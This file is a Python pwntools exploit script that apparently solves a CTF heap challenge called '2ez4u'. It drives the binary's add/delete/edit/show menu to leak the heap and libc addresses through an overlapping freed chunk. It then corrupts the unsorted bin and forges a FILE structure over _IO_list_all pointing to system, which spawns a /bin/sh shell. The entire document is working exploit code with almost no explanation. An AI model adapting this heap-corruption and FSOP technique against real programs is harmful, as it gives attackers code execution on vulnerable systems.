#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./2ez4u"
ENV = {"LD_PRELOAD":"./libc.so.6"}

p = process(elf)

def add(length, s):
    p.recvuntil("your choice: ")
    p.sendline("1")
    p.recvuntil("color?(0:red, 1:green):")
    p.sendline(str(0))
    p.recvuntil("value?(0-999):")
    p.sendline(str(0))
    p.recvuntil("num?(0-16):")
    p.sendline(str(0))
    p.recvuntil("description length?(1-1024):")
    p.sendline(str(length))
    p.recvuntil("description of the apple:")
    p.send(s)

def delete(idx):
    p.recvuntil("your choice: ")
    p.sendline("2")
    p.recvuntil("which?(0-15):")
    p.sendline(str(idx))

def edit(idx, s):
    p.recvuntil("your choice: ")
    p.sendline("3")
    p.recvuntil("which?(0-15):")
    p.sendline(str(idx))
    p.recvuntil("color?(0:red, 1:green):")
    p.sendline(str(0))
    p.recvuntil("value?(0-999):")
    p.sendline(str(0))
    p.recvuntil("num?(0-16):")
    p.sendline(str(0))
    p.recvuntil("new description of the apple:") 
    p.send(s)

def show(idx):
    p.recvuntil("your choice: ")
    p.sendline("4")
    p.recvuntil("which?(0-15):")
    p.sendline(str(idx))


add(0x80-0x18, p8(0)*(0x80-0x18))  # 0
add(0x80-0x18, p8(0)*(0x80-0x18))  # 1
add(0x3f0-0x18, p8(0)*(0x3f0-0x18))    # 2
add(0x10, p8(0)*0x10)  # 3

delete(0)
delete(2)
add(0x400-0x18, p8(0)*(0x400-0x18))    # 0

show(2)
p.recvuntil("description:")
heap_base = u64(p.recv(6).ljust(8, "\x00"))-0x120
log.info("heap_base: "+hex(heap_base))

delete(1)
add(0x120-0x18, p8(0)*(0x120-0x18))    # 1

show(2)
p.recvuntil("description:")
libc_base = u64(p.recv(6).ljust(8, "\x00"))-0x3c4b78
log.info("libc_base: "+hex(libc_base))

bin_sh_addr = heap_base+0x140
unsorted_bin_addr = libc_base+0x3c4b78
io_list_all = libc_base+0x3c5520
system_addr = libc_base+0x45390
io_str_jumps = libc_base+0x3c37a0

delete(1)
payload = "/bin/sh\x00"
payload += p8(0)*(0x138-0x18-len(payload))
add(0x138-0x18, payload) # 1

payload = p64(0x61)
payload += p64(unsorted_bin_addr)
payload += p64(io_list_all-0x10)
payload += p64(0)
payload += p64(0x7fffffffffffffff)
payload += p64(0)*2
payload += p64(((heap_base+0x28)-0x64)/2)
payload += p8(0)*(0xd8-0x8-len(payload))
payload += p64(io_str_jumps)
payload += p64(system_addr)
payload += p8(0)*(0x3d8-len(payload))
edit(2, payload)

#gdb.attach(p)
p.recvuntil("your choice: ")
p.sendline("1")
p.recvuntil("color?(0:red, 1:green):")
p.sendline(str(0))
p.recvuntil("value?(0-999):")
p.sendline(str(0))
p.recvuntil("num?(0-16):")
p.sendline(str(0))
p.recvuntil("description length?(1-1024):")
p.sendline(str(0x10))

p.interactive()
